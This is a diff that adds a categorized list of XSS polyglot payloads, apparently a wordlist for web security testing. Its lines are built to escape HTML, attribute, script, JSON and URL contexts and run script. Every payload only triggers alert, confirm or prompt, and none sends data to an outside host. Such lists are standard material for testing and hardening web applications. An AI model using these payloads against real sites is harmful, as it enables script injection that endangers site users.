@@ -1,0 +1,195 @@
+# XSS Polyglot Payloads
+# These payloads work in multiple contexts (HTML, attribute, JavaScript, etc.)
+
+# Classic polyglots
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+# Compact polyglots
+'">><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+'"--></style></script><script>alert(1)</script>
+'"--></style></script><svg onload=alert(1)>
+'"><svg/onload=alert(1)>
+
+# Breaking multiple contexts
+">><script>alert(1)</script>
+'>><script>alert(1)</script>
+"></script><script>alert(1)</script>
+'></script><script>alert(1)</script>
+
+# With closing tags
+"></title><script>alert(1)</script>
+'></title><script>alert(1)</script>
+"></textarea><script>alert(1)</script>
+'></textarea><script>alert(1)</script>
+"></style><script>alert(1)</script>
+'></style><script>alert(1)</script>
+
+# SVG-based polyglots
+'"><svg/onload=alert(1)//
+"><svg/onload=alert(1)//
+'"><svg><script>alert(1)</script></svg>
+"><svg><script>alert(1)</script></svg>
+
+# IMG-based polyglots
+'"><img src=x onerror=alert(1)//
+"><img src=x onerror=alert(1)//
+'"><img/src=x/onerror=alert(1)>
+"><img/src=x/onerror=alert(1)>
+
+# JavaScript context polyglots
+';alert(1)//\
+";alert(1)//\
+`;alert(1)//\
+';alert(1);</script><script>alert(1)</script>
+";alert(1);</script><script>alert(1)</script>
+
+# Unicode-based polyglots
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003csvg/onload=alert(1)\u003e
+\x3csvg/onload=alert(1)\x3e
+
+# HTML entity polyglots
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e
+
+# Encoding variations
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg/onload=alert(1)%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+
+# With HTML comments
+<!--><script>alert(1)</script>-->
+<!--'><script>alert(1)</script>-->
+<!--"><script>alert(1)</script>-->
+<!--><svg onload=alert(1)>-->
+
+# Breaking CDATA
+<![CDATA[><script>alert(1)</script>]]>
+]]><script>alert(1)</script><![CDATA[
+
+# Protocol-based polyglots
+javascript:alert(1)//\
+javascript:alert(1);</script><script>alert(1)</script>
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Advanced polyglots with multiple escape sequences
+'"--></style></script></textarea></title><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+'">><marquee><img src=x onerror=alert(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=alert(1)>
+'"<script>alert(1)</script><img src=x onerror=alert(1)><svg onload=alert(1)>
+
+# Nested context breaks
+'";alert(1);//</script><script>alert(1)</script>
+"';alert(1);//</script><script>alert(1)</script>
+
+# Template literal polyglots
+`;alert(1);//</script><script>alert(1)</script>
+`${alert(1)}</script><script>alert(1)</script>
+
+# With various event handlers
+'"><img src=x onerror=alert(1) onload=alert(2)>
+"><input onfocus=alert(1) autofocus>
+'"><body onload=alert(1)>
+"><svg onload=alert(1) onmouseover=alert(2)>
+
+# Multiple tag types
+'"><script>alert(1)</script><img src=x onerror=alert(2)>
+"><iframe src=javascript:alert(1)></iframe><svg onload=alert(2)>
+
+# With attributes and events
+'"><a href=javascript:alert(1) onclick=alert(2)>click</a>
+"><form action=javascript:alert(1)><input type=submit>
+
+# Breaking out of JSON
+{"x":"'><script>alert(1)</script>"}
+{"x":"\"<script>alert(1)</script>"}
+
+# XML/XHTML polyglots
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+<x:svg xmlns:x="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+# Breaking meta tags
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+'><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Breaking link tags
+'><link rel="import" href="data:text/html,<script>alert(1)</script>">
+"><link rel="import" href="javascript:alert(1)">
+
+# Base tag polyglots
+'><base href="javascript://"><a href="/alert(1)">click</a>
+"><base href="javascript://"><a href="/alert(1)">click</a>
+
+# Object/embed polyglots
+'><object data="javascript:alert(1)">
+"><embed src="javascript:alert(1)">
+'><object data="data:text/html,<script>alert(1)</script>">
+
+# Audio/video polyglots
+'><video src=x onerror=alert(1)>
+"><audio src=x onerror=alert(1)>
+
+# Form-based polyglots
+'><form action=javascript:alert(1)><input type=submit>
+"><button formaction=javascript:alert(1)>click</button>
+
+# Details/summary polyglots
+'><details open ontoggle=alert(1)>
+"><details><summary>x</summary><script>alert(1)</script></details>
+
+# Marquee polyglots
+'><marquee onstart=alert(1)>
+"><marquee><script>alert(1)</script></marquee>
+
+# Math polyglots
+'><math><mi xlink:href="javascript:alert(1)">x</mi>
+"><math><mtext><script>alert(1)</script></mtext></math>
+
+# Style-based polyglots
+'><style>*{background:url('javascript:alert(1)')}</style>
+"><style>@import'javascript:alert(1)';</style>
+
+# Template polyglots
+'><template><script>alert(1)</script></template>
+"><template><img src=x onerror=alert(1)></template>
+
+# Minimal polyglots
+'"><script>alert(1)</script>
+'"><svg onload=alert(1)>
+'"><img src=x onerror=alert(1)>
+';alert(1);//
+";alert(1);//
+</script><script>alert(1)</script>
+
+# Case variation polyglots
+'"><ScRiPt>alert(1)</sCrIpT>
+"><IMG SRC=x ONERROR=alert(1)>
+'"><SvG OnLoAd=alert(1)>
+
+# Using different quotes
+'"<script>alert(1)</script>
+"`<script>alert(1)</script>
+'`<script>alert(1)</script>
+
+# Breaking with null bytes
+'><script>alert(1)%00</script>
+"><img src=x onerror=alert(1)%00>
+
+# Using HTML5 tags
+'><canvas height="0" width="0"></canvas><script>alert(1)</script>
+"><output>test</output><script>alert(1)</script>
+
+# Breaking with special characters
+'--></style></script><script>alert(1)</script><!--
+"--></style></script><script>alert(1)</script><!--
+
+# Universal XSS polyglots (work in most contexts)
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+'">><img src=x onerror=alert(1)><!--
+-->'"><script>alert(1)</script>
+
